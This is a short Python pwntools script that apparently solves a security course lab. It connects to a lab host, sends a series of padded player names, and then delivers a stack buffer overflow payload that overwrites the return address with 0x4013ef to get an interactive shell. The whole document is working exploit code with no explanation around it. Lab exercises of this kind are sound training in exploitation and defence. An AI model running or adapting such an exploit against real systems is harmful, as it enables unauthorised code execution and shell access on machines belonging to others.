from pwn import *

# Launch exploit process
#p = gdb.debug("./lab8-1.bin")            # run exploit against binary locally with process attached to gdb
#p = process("./lab8-1.bin")              # run exploit against binary locally without attacking the process to gdb
p = remote("csc748.hostbin.org", 7081)   # run the exploit against a remote process
print("\n")

# Read prompt
playerName = p.recvuntil("Enter player name (or 'done' to finish):").decode("utf-8")
print(playerName)
print("\n")

# Send player name
p.sendline(b'A'*64)

# Read prompt
playerName = p.recvuntil("Enter player name (or 'done' to finish):").decode("utf-8")
print(playerName)
print("\n")

# Send player name
p.sendline(b'B'*32)

# Read prompt
playerName = p.recvuntil("Enter player name (or 'done' to finish):").decode("utf-8")
print(playerName)
print("\n")

# Send option to exit
p.sendline(b'done')

# Read prompt
arrowType = p.recvuntil("What type of arrow would you like to use?:").decode("utf-8")
print(arrowType)
#print("\n")

# Send arrow type
payload = p64(0x4013ef)
p.sendline(b'E'*72 + b'1' + b'E'*7 + payload)

# Switch to interactive after gaining shell
p.interactive()
